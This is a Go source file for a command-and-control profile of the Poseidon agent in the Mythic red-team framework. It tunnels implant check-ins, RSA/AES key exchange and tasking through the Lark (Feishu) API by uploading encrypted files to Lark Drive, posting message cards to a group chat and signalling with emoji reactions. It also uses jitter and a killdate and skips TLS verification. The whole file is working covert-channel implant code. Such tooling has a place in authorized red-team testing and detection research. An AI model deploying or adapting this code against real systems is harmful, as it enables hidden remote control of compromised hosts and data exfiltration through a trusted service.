//go:build (linux || darwin) && lark
// +build linux darwin
// +build lark

package profiles

import (
	"bytes"
	"crypto/rsa"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"math/rand"
	"mime/multipart"
	"net/http"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/Jeffail/gabs/v2"

	// Poseidon
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/crypto"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

// All code apdated from Mythic's HTTP C2 profile https://github.com/MythicC2Profiles/http/
// All variables must be a string so they can be set with ldflags

// lark API endpoint
var base_url string = "https://open.feishu.cn/open-apis/"

// lark bot config
var lark_groupchat_name string
var lark_app_id string
var lark_app_secret string

// killdate is the Killdate
var killdate string

// encrypted_exchange_check is Perform Key Exchange
var encrypted_exchange_check string

// callback_interval is the callback interval in seconds
var callback_interval string

// callback_jitter is Callback Jitter in percent
var callback_jitter string

// AESPSK is the Crypto type
var AESPSK string

type C2Default struct {
	LarkGroupchatName string
	LarkAppId         string
	LarkAppSecret     string
	Interval          int
	Jitter            int
	ExchangingKeys    bool
	Key               string
	RsaPrivateKey     *rsa.PrivateKey
	Killdate          time.Time
}

func New() structs.Profile {

	killDateString := fmt.Sprintf("%sT00:00:00.000Z", killdate)
	killDateTime, err := time.Parse("2006-01-02T15:04:05.000Z", killDateString)
	if err != nil {
		os.Exit(1)
	}
	profile := C2Default{
		LarkGroupchatName: lark_groupchat_name,
		LarkAppId:         lark_app_id,
		LarkAppSecret:     lark_app_secret,
		Key:               AESPSK,
		Killdate:          killDateTime,
	}

	// Convert sleep from string to integer
	i, err := strconv.Atoi(callback_interval)
	if err == nil {
		profile.Interval = i
	} else {
		profile.Interval = 10
	}

	// Convert jitter from string to integer
	j, err := strconv.Atoi(callback_jitter)
	if err == nil {
		profile.Jitter = j
	} else {
		profile.Jitter = 23
	}

	if encrypted_exchange_check == "T" {
		profile.ExchangingKeys = true
	}

	return &profile
}

func (c *C2Default) Start() {

	// Checkin with Mythic via an egress channel
	for {
		resp := c.CheckIn()
		checkIn := resp.(structs.CheckInMessageResponse)
		// If we successfully checkin, get our new ID and start looping
		if strings.Contains(checkIn.Status, "success") {
			SetMythicID(checkIn.ID)
			for {
				// loop through all task responses
				message := CreateMythicMessage()
				if encResponse, err := json.Marshal(message); err == nil {
					//fmt.Printf("Sending to Mythic: %v\n", string(encResponse))
					resp := c.SendMessage(encResponse).([]byte)
					if len(resp) > 0 {
						//fmt.Printf("Raw resp: \n %s\n", string(resp))
						taskResp := structs.MythicMessageResponse{}
						if err := json.Unmarshal(resp, &taskResp); err != nil {
							//log.Printf("Error unmarshal response to task response: %s", err.Error())
							time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
							continue
						}
						HandleInboundMythicMessageFromEgressP2PChannel <- taskResp
					}
				} else {
					//fmt.Printf("Failed to marshal message: %v\n", err)
				}
				time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
			}
		} else {
			//fmt.Printf("Uh oh, failed to checkin\n")
		}
	}

}

func (c *C2Default) GetSleepTime() int {
	if c.Jitter > 0 {
		jit := float64(rand.Int()%c.Jitter) / float64(100)
		jitDiff := float64(c.Interval) * jit
		if int(jit*100)%2 == 0 {
			return c.Interval + int(jitDiff)
		} else {
			return c.Interval - int(jitDiff)
		}
	} else {
		return c.Interval
	}
}

func (c *C2Default) SetSleepInterval(interval int) string {
	if interval >= 0 {
		c.Interval = interval
		return fmt.Sprintf("Sleep interval updated to %ds\n", interval)
	} else {
		return fmt.Sprintf("Sleep interval not updated, %d is not >= 0", interval)
	}

}

func (c *C2Default) SetSleepJitter(jitter int) string {
	if jitter >= 0 && jitter <= 100 {
		c.Jitter = jitter
		return fmt.Sprintf("Jitter updated to %d%% \n", jitter)
	} else {
		return fmt.Sprintf("Jitter not updated, %d is not between 0 and 100", jitter)
	}
}

func (c *C2Default) ProfileType() string {
	return "lark"
}

// CheckIn a new agent
func (c *C2Default) CheckIn() interface{} {

	// Start Encrypted Key Exchange (EKE)
	if c.ExchangingKeys {
		for !c.NegotiateKey() {
			// loop until we successfully negotiate a key
		}
	}

	for {
		checkin := CreateCheckinMessage()
		if raw, err := json.Marshal(checkin); err != nil {
			time.Sleep(time.Duration(c.GetSleepTime()))
			continue
		} else {
			resp := c.SendMessage(raw).([]byte)

			// save the Mythic id
			response := structs.CheckInMessageResponse{}
			if err = json.Unmarshal(resp, &response); err != nil {
				//log.Printf("Error in unmarshal:\n %s", err.Error())
				time.Sleep(time.Duration(c.GetSleepTime()))
				continue
			}
			if len(response.ID) != 0 {
				//log.Printf("Saving new UUID: %s\n", response.ID)
				SetMythicID(response.ID)
				return response
			} else {
				time.Sleep(time.Duration(c.GetSleepTime()))
				continue
			}
		}

	}

}

// NegotiateKey - EKE key negotiation
func (c *C2Default) NegotiateKey() bool {
	sessionID := GenerateSessionID()
	pub, priv := crypto.GenerateRSAKeyPair()
	c.RsaPrivateKey = priv
	// Replace struct with dynamic json
	initMessage := structs.EkeKeyExchangeMessage{}
	initMessage.Action = "staging_rsa"
	initMessage.SessionID = sessionID
	initMessage.PubKey = base64.StdEncoding.EncodeToString(pub)

	// Encode and encrypt the json message
	raw, err := json.Marshal(initMessage)
	//log.Println(unencryptedMsg)
	if err != nil {
		return false
	}

	resp := c.SendMessage(raw).([]byte)

	// Decrypt & Unmarshal the response
	sessionKeyResp := structs.EkeKeyExchangeMessageResponse{}
	err = json.Unmarshal(resp, &sessionKeyResp)
	if err != nil {
		//log.Printf("Error unmarshaling eke response: %s\n", err.Error())
		return false
	}

	encryptedSessionKey, _ := base64.StdEncoding.DecodeString(sessionKeyResp.SessionKey)
	decryptedKey := crypto.RsaDecryptCipherBytes(encryptedSessionKey, c.RsaPrivateKey)
	c.Key = base64.StdEncoding.EncodeToString(decryptedKey) // Save the new AES session key
	c.ExchangingKeys = false

	if len(sessionKeyResp.UUID) > 0 {
		SetMythicID(sessionKeyResp.UUID) // Save the new, temporary UUID
	} else {
		return false
	}

	return true
}

// PostResponse - Post task responses
func (c *C2Default) SendMessage(output []byte) interface{} {
	return c.htmlPostData(output)

}

var tr = &http.Transport{
	TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	MaxIdleConns:    10,
	MaxConnsPerHost: 10,
	//IdleConnTimeout: 1 * time.Nanosecond,
}
var client = &http.Client{
	Timeout:   90 * time.Second,
	Transport: tr,
}

// Lark implementation of htmlPostData
func (c *C2Default) htmlPostData(sendData []byte) []byte {

	// If the AesPSK is set, encrypt the data we send
	if len(c.Key) != 0 {
		sendData = c.encryptMessage(sendData)
	}

	if GetMythicID() != "" {
		sendData = append([]byte(GetMythicID()), sendData...) // Prepend the UUI
	} else {
		sendData = append([]byte(UUID), sendData...) // Prepend the UUID
	}

	sendDataBase64 := []byte(base64.StdEncoding.EncodeToString(sendData)) // Base64 encode and convert to raw bytes

	for true {

		today := time.Now()
		if today.After(c.Killdate) {
			os.Exit(1)
		}

		// Get Tenant Access Token
		token, err := c.get_tenant_access_token(base_url, c.LarkAppId, c.LarkAppSecret)
		if err != nil {
			//fmt.Println(err)
			continue
		}

		// Get Folder ID
		rootFolderID, err := c.get_root_folder(base_url, token)
		if err != nil {
			//fmt.Println(err)
			continue
		}

		// Upload File
		file_id, err := c.upload_file(base_url, token, string(sendDataBase64), rootFolderID)
		if err != nil {
			//fmt.Println(err)
			continue
		}

		// Get Group Chat ID
		chat_id, err := c.get_group_chat_id(base_url, token, c.LarkGroupchatName)
		if err != nil {
			//fmt.Println(err)
			continue
		}

		// Create Message Card
		card_data := c.create_message_card(file_id, "PROBE")

		// Send Message Card
		msg_id, err := c.send_message_card(base_url, token, chat_id, card_data)
		if err != nil {
			//fmt.Println(err)
			continue
		}

		// Add Reaction (checkin)
		_, err = c.add_reaction(base_url, token, msg_id, "GLANCE")
		if err != nil {
			//fmt.Println(err)
			continue
		}

		/*

			- Need to give the server time to update message card, however, we cant use the agent
			sleep time because if it is set too low it will break the flow, and the agent will
			never check in again

			- If sleep time <15s, override to 15-30s, and check for an update a max of 3x

		*/

		var title string
		var body string

		for msg_check := 0; msg_check < 3; msg_check++ {

			if c.Interval < 15 {
				minSleep := 15
				maxSleep := 30
				rand.Seed(time.Now().UnixNano())
				time.Sleep(time.Duration(rand.Intn(maxSleep-minSleep)+minSleep) * time.Second)
			} else {
				time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
			}

			title, body, err = c.get_message_content(base_url, token, msg_id)
			if err != nil {
				//fmt.Println(err)
				continue
			}

			if title == "TASK" {
				break
			}
		}

		// Failed to get tasking
		if title != "TASK" {
			continue
		}

		respBody, err := c.download_file(base_url, token, body)

		raw, err := base64.StdEncoding.DecodeString(respBody)
		if err != nil {
			//fmt.Printf("error base64.StdEncoding: %v\n", err)
			time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
			continue
		} else if len(raw) < 36 {
			//fmt.Printf("error len(raw) < 36: %v\n", err)
			time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
			continue
		} else if len(c.Key) != 0 {
			enc_raw := c.decryptMessage(raw[36:])
			if len(enc_raw) == 0 {
				//fmt.Printf("error decrypt length wrong: %v\n", err)
				time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
				continue
			} else {
				// Message parsed properly, add SMILE reaction so server can delete the file
				//fmt.Printf("response: %v\n", enc_raw)
				_, err = c.add_reaction(base_url, token, msg_id, "SMILE")
				if err != nil {
					//fmt.Println(err)
					continue
				}
				return enc_raw
			}
		} else {
			// Message parsed properly, add SMILE reaction so server can delete the file
			//fmt.Printf("response: %v\n", raw[36:])
			_, err = c.add_reaction(base_url, token, msg_id, "SMILE")
			if err != nil {
				//fmt.Println(err)
				continue
			}
			return raw[36:]
		}
		//fmt.Printf("shouldn't be here\n")
		return make([]byte, 0)

	}
	//fmt.Printf("shouldn't be here either\n")
	return make([]byte, 0) //shouldn't get here

}

func (c *C2Default) encryptMessage(msg []byte) []byte {
	key, _ := base64.StdEncoding.DecodeString(c.Key)
	return crypto.AesEncrypt(key, msg)
}

func (c *C2Default) decryptMessage(msg []byte) []byte {
	key, _ := base64.StdEncoding.DecodeString(c.Key)
	return crypto.AesDecrypt(key, msg)
}

func (c *C2Default) get_tenant_access_token(base_url string, app_id string, app_secret string) (string, error) {
	url := fmt.Sprintf("%sauth/v3/tenant_access_token/internal", base_url)
	body := []byte(fmt.Sprintf(`{"app_id":"%s", "app_secret":"%s"}`, app_id, app_secret))
	bodyReader := bytes.NewReader(body)

	req, err := http.NewRequest(http.MethodPost, url, bodyReader)
	if err != nil {
		return "", errors.New("could not create request for tenant_access_token")
	}
	req.Header.Set("Content-Type", "application/json")

	res, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer res.Body.Close()

	res_body, err := ioutil.ReadAll(res.Body)
	if err != nil {
		return "", err
	}

	res_json, err := gabs.ParseJSON(res_body)
	if err != nil {
		return "", err
	}
	tokenExists := res_json.Exists("tenant_access_token")
	if !tokenExists {
		return "", errors.New("tenant access token is not in response")
	}
	tenantToken := res_json.Path("tenant_access_token").Data().(string)
	return tenantToken, nil
}

func (c *C2Default) get_root_folder(base_url string, token string) (string, error) {
	url := fmt.Sprintf("%sdrive/explorer/v2/root_folder/meta", base_url)

	req, err := http.NewRequest(http.MethodGet, url, nil)
	if err != nil {
		return "", errors.New("could not create request for get_root_folder")
	}
	req.Header.Set("Authorization", fmt.Sprintf("Bearer %s", token))

	res, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer res.Body.Close()

	res_body, err := ioutil.ReadAll(res.Body)
	if err != nil {
		return "", err
	}

	res_json, err := gabs.ParseJSON(res_body)
	if err != nil {
		return "", err
	}

	tokenExists := res_json.Exists("data", "token")
	if !tokenExists {
		return "", errors.New("root folder token is not in response")
	}

	folderToken := res_json.Path("data.token").Data().(string)
	return folderToken, nil

}

func (c *C2Default) create_message_card(body string, title string) string {
	message := `{
        "config": {
            "wide_screen_mode": true,
            "update_multi": true
        },
        "elements": [
            {
                "tag": "hr"
            },
            {
                "tag": "div",
                "text": {
                    "content": "%s",
                    "tag": "lark_md"
                }
            },
            {
                "tag": "hr"
            }
        ],
        "header": {
            "template": "blue",
            "title": {
                "content": "%s",
                "tag": "plain_text"
            }
        }
	}`
	card_data := fmt.Sprintf(message, body, title)
	return card_data
}

func (c *C2Default) get_group_chat_id(base_url string, token string, group_name string) (string, error) {
	url := fmt.Sprintf("%sim/v1/chats", base_url)

	req, err := http.NewRequest(http.MethodGet, url, nil)
	if err != nil {
		return "", errors.New("could not create request for get_group_chat_id")
	}
	req.Header.Set("Authorization", fmt.Sprintf("Bearer %s", token))

	queryParam := req.URL.Query()
	queryParam.Add("page_size", "50")
	req.URL.RawQuery = queryParam.Encode()

	res, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer res.Body.Close()

	res_body, err := ioutil.ReadAll(res.Body)
	if err != nil {
		return "", err
	}

	res_json, err := gabs.ParseJSON(res_body)
	if err != nil {
		return "", err
	}

	/*
		We are searching the following structure here. Find the chat_id of our target group

		{data:
			{items:
				[
					{chat_id:x1, name:y1},
					{chat_id:x2, name:y2}
				]
			}
		}

	*/

	for _, child := range res_json.S("data", "items").Children() {
		if child.S("name").Data().(string) == group_name {
			return child.S("chat_id").Data().(string), nil
		}

	}
	return "", errors.New("could not find chat_id of group")

}

func (c *C2Default) send_message_card(base_url string, token string, chat_id string, card_data string) (string, error) {
	url := fmt.Sprintf("%sim/v1/messages", base_url)

	req_body := map[string]interface{}{
		"receive_id": chat_id,
		"msg_type":   "interactive",
		"content":    card_data,
	}
	json_req_body, err := json.Marshal(req_body)
	if err != nil {
		return "", errors.New("failed to marshal send_message_card body")
	}

	body := bytes.NewReader(json_req_body)

	req, err := http.NewRequest(http.MethodPost, url, body)
	if err != nil {
		return "", errors.New("could not create request for send_message_card")
	}
	req.Header.Set("Authorization", fmt.Sprintf("Bearer %s", token))
	req.Header.Set("Content-Type", "application/json")

	queryParam := req.URL.Query()
	queryParam.Add("receive_id_type", "chat_id")
	req.URL.RawQuery = queryParam.Encode()

	res, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer res.Body.Close()

	res_body, err := ioutil.ReadAll(res.Body)
	if err != nil {
		return "", err
	}

	res_json, err := gabs.ParseJSON(res_body)
	if err != nil {
		return "", err
	}

	res_msg := res_json.Exists("msg")
	if !res_msg {
		return "", errors.New("error in send_message_card msg does not exist")
	}

	msg := res_json.Path("msg").Data().(string)
	if msg != "success" {
		return "", errors.New("error in send_message_card msg is not success")
	}

	msg_id_exists := res_json.Exists("data", "message_id")
	if !msg_id_exists {
		return "", errors.New("message_id not in send_message_card response")
	}

	msg_id := res_json.Path("data.message_id").Data().(string)
	return msg_id, nil

}

func (c *C2Default) get_message_content(base_url string, token string, msg_id string) (string, string, error) {
	url := fmt.Sprintf("%sim/v1/messages/%s", base_url, msg_id)

	req, err := http.NewRequest(http.MethodGet, url, nil)
	if err != nil {
		return "", "", errors.New("could not create request for get_group_chat_id")
	}
	req.Header.Set("Authorization", fmt.Sprintf("Bearer %s", token))

	res, err := client.Do(req)
	if err != nil {
		return "", "", err
	}
	defer res.Body.Close()

	res_body, err := ioutil.ReadAll(res.Body)
	if err != nil {
		return "", "", err
	}

	res_json, err := gabs.ParseJSON(res_body)
	if err != nil {
		return "", "", err
	}

	/*
		We are searching the following structure here. Find the title and body of our message card

		{data:
			{items:
				[
					body:
						{content:
							{"title": "title here"}
							elements: [
								[],
								[{"tag:text", "text": "BODY CONTENT"}],
								[{"tag":"hr"}]
							]
				]
			}
		}

	*/

	for _, child := range res_json.S("data", "items").Children() {
		card_content, err := gabs.ParseJSON([]byte(child.S("body", "content").Data().(string)))
		if err != nil {
			return "", "", errors.New("error parsing content in get_message_content")
		}
		title_content := strings.Trim(card_content.Path("title").String(), "\"")
		body_content := strings.Trim(card_content.Path("elements.1.0.text").String(), "\"")
		return title_content, body_content, nil
	}
	return "", "", errors.New("error in get_message_content could not find body content")

}

func (c *C2Default) update_message_card(base_url string, token string, message_id string, card_data string) (string, error) {
	url := fmt.Sprintf("%sim/v1/messages/%s", base_url, message_id)

	req_body := map[string]interface{}{
		"content": card_data,
	}
	json_req_body, err := json.Marshal(req_body)
	if err != nil {
		return "", errors.New("failed to marshal update_message_card body")
	}

	body := bytes.NewReader(json_req_body)

	req, err := http.NewRequest(http.MethodPatch, url, body)
	if err != nil {
		return "", errors.New("could not create request for send_message_card")
	}
	req.Header.Set("Authorization", fmt.Sprintf("Bearer %s", token))
	req.Header.Set("Content-Type", "application/json")

	res, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer res.Body.Close()

	res_body, err := ioutil.ReadAll(res.Body)
	if err != nil {
		return "", err
	}

	res_json, err := gabs.ParseJSON(res_body)
	if err != nil {
		return "", err
	}

	res_msg := res_json.Exists("msg")
	if !res_msg {
		return "", errors.New("error in update_message_card msg does not exist")
	}

	msg := res_json.Path("msg").Data().(string)
	//fmt.Println(msg)
	if msg != "success" {
		return "", errors.New("error in update_message_card msg is not success")
	}

	return msg, nil
}

func (c *C2Default) add_reaction(base_url string, token string, message_id string, emoji string) (string, error) {
	url := fmt.Sprintf("%sim/v1/messages/%s/reactions", base_url, message_id)

	gabs_body := gabs.New()
	gabs_body.Set(emoji, "reaction_type", "emoji_type") // {"reaction_type":{"emoji_type":"SMILE"}}
	str_body := gabs_body.String()
	body := strings.NewReader(str_body)

	req, err := http.NewRequest(http.MethodPost, url, body)
	if err != nil {
		return "", errors.New("could not create request for send_message_card")
	}
	req.Header.Set("Authorization", fmt.Sprintf("Bearer %s", token))
	req.Header.Set("Content-Type", "application/json")

	res, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer res.Body.Close()

	res_body, err := ioutil.ReadAll(res.Body)
	if err != nil {
		return "", err
	}

	res_json, err := gabs.ParseJSON(res_body)
	if err != nil {
		return "", err
	}

	res_msg := res_json.Exists("msg")
	if !res_msg {
		return "", errors.New("error in add_reaction msg does not exist")
	}

	msg := res_json.Path("msg").Data().(string)
	//fmt.Println(msg)
	if msg != "success" {
		return "", errors.New("error in add_reaction msg is not success")
	}

	return msg, nil
}

func (c *C2Default) upload_file(base_url string, token string, data string, folder_token string) (string, error) {
	url := fmt.Sprintf("%sdrive/v1/files/upload_all", base_url)

	payload := &bytes.Buffer{}
	writer := multipart.NewWriter(payload)
	_ = writer.WriteField("file_name", "test.txt")
	_ = writer.WriteField("parent_type", "explorer")
	_ = writer.WriteField("parent_node", folder_token)
	_ = writer.WriteField("size", fmt.Sprintf("%d", len(data)))
	fileWriter, _ := writer.CreateFormFile("file", "test.txt")

	_, err := io.Copy(fileWriter, bytes.NewBuffer([]byte(data)))
	if err != nil {
		return "", errors.New("error in upload_file failed to copy data")
	}
	err = writer.Close()
	if err != nil {
		return "", errors.New("error in upload_file failed to close writer")
	}

	req, err := http.NewRequest(http.MethodPost, url, payload)
	if err != nil {
		return "", errors.New("could not create request for upload_file")
	}

	req.Header.Set("Authorization", fmt.Sprintf("Bearer %s", token))
	req.Header.Set("Content-Type", writer.FormDataContentType())

	res, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer res.Body.Close()

	res_body, err := ioutil.ReadAll(res.Body)
	if err != nil {
		return "", err
	}

	res_json, err := gabs.ParseJSON(res_body)
	if err != nil {
		return "", err
	}

	fileTokenExists := res_json.Exists("data", "file_token")
	if !fileTokenExists {
		return "", errors.New("file_token is not in response")
	}

	folderToken := res_json.Path("data.file_token").Data().(string)
	return folderToken, nil

}

// download file
func (c *C2Default) download_file(base_url string, token string, file_token string) (string, error) {
	url := fmt.Sprintf("%sdrive/v1/files/%s/download", base_url, file_token)

	req, err := http.NewRequest(http.MethodGet, url, nil)
	if err != nil {
		return "", errors.New("could not create request for download_file")
	}

	req.Header.Set("Authorization", fmt.Sprintf("Bearer %s", token))
	res, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer res.Body.Close()

	res_body, err := ioutil.ReadAll(res.Body)
	if err != nil {
		return "", err
	}
	//fmt.Println(res_body)
	return string(res_body), nil

}
